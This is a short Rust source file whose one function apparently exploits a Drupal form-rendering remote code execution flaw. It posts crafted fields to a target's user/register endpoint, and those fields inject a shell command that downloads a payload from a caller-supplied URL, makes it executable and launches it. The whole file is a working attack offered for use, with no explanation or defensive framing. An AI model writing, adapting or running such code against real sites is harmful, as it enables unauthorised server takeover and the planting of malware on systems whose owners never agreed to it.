extern crate reqwest;
pub async fn deploy(target: &str, payload: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let endpoint = "user/register";
    let query = "element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
    let req = [
        ("form_id", "user_register_form"),
        ("_drupal_ajax", "1"),
        ("mail[#post_render][]", "exec"),
        ("mail[#type]", "markup"),
        (
            "mail[#markup]",
            &format!(
                "echo 'wget {} -O ~/payload; chmod +x ~/payload; ~/payload launch &' | bash",
                payload
            )[..],
        ),
    ];

    println!("{:?}", req);

    let _resp = client
        .post(&format!("http://{}/{}?{}", target, endpoint, query)[..])
        .form(&req)
        .send()
        .await?;

    Ok(())
}
